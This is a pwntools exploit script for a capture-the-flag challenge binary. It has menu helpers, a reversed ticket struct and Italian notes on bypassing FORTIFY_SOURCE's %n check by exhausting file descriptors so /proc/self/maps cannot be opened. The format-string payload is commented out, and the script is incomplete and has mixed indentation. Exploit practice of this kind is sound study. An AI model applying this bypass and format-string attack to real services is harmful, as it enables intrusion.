#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# split tmux pane
#context.terminal = ["tmux", "splitw", "-vf","-p", "70"]
# spawn new window
context.terminal = ["tmux", "neww", "-n", "shell"]

#context.log_level = "debug"
DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc "	# `nc <host> <port>`

ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
bstr = lambda x: str(x).encode()
aleak = lambda elfname, addr: log.info(elfname + " @ 0x" + format(addr, 'x'))
vleak = lambda valname, val: log.info(valname + " @ 0x" + format(val, 'x'))
chunks = lambda data: [data[i:i+context.bytes] for i in range(0, len(data), context.bytes)]

GDB_SCRIPT = """
b *printf
"""

if args.GDB:
    r = gdb.debug(exe.path,gdbscript=GDB_SCRIPT)
elif args.LOCAL:
    r = process(exe.path)
elif args.DOCKER:
    r = remote("localhost", DOCKER_PORT)
else:
    r = remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))


ru  = lambda *x, **y: r.recvuntil(*x, **y)
rl  = lambda *x, **y: r.recvline(*x, **y)
rc  = lambda *x, **y: r.recv(*x, **y)
sla = lambda *x, **y: r.sendlineafter(*x, **y)
sa  = lambda *x, **y: r.sendafter(*x, **y)
sl  = lambda *x, **y: r.sendline(*x, **y)
sn  = lambda *x, **y: r.send(*x, **y)

def add(name):
	sla('> ','1')
	sla(': ', name)
	return rl()

def show():
	sla('> ', '2')
	

def update(num, msg):
	sla(b'> ', b'3')
	sla(b'number: ', num.encode())
	sla(b'Message: ', msg.encode())
	return rl(2)

def close(num, msg):
	sla('> ', '4')
	sla(b'number: ', num)
	sla(b'message: ', msg) # frmt str vuln, fortify
	return rl()


'''
00000000 struct __attribute__((aligned(4))) ticket // sizeof=0x18
00000000 {                                       // XREF: ticket_t/r
		  00000000     char *name;
		  00000008     FILE *file;
		  00000010     status_t status;
		  00000014     __int16 idx;
		  00000016     // padding byte
		  00000017     // padding byte
		  00000018 };


'''




'''
se dai %n 
internamente con strace: 
read(0, "n", 1)                         = 1
read(0, "\n", 1)                        = 1
openat(AT_FDCWD, "/proc/self/maps", O_RDONLY|O_CLOEXEC) = 4
newfstatat(4, "", {st_mode=S_IFREG|0444, st_size=0, ...}, AT_EMPTY_PATH) = 0
read(4, "5649c9d88000-5649c9d89000 r--p 0"..., 1024) = 1024
close(4)                                = 0
writev(2, [{iov_base="*** %n in writable segment detec"..., iov_len=40}], 1*** %n in writable segment detected ***
) = 40
mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7703b8239000
rt_sigprocmask(SIG_UNBLOCK, [ABRT], NULL, 8) = 0
gettid()                                = 347456
getpid()                                = 347456
tgkill(347456, 347456, SIGABRT)         = 0
--- SIGABRT {si_signo=SIGABRT, si_code=SI_TKILL, si_pid=347456, si_uid=1000} ---
+++ killed by SIGABRT (core dumped) +++


problema: come bypassi fortify

openat(AT_FDCWD, "/proc/self/maps", O_RDONLY|O_CLOEXEC) = 4
per controllare con fortify se il segment  e' writable  durante printf, apre proc/self/map  
se spawni un botto di  file non riesce ad aprirlo e il check viene automaticamente bypassato! 
->  spawna file -> format string?


'''

def main():
    for i in range(256):
		add(f'f_{i}')
	#close('0', "%c%c%c".encode())
	#update('0', 'b')
	r.interactive()
	show()
	#close()


	r.interactive()


if __name__ == "__main__":
    main()
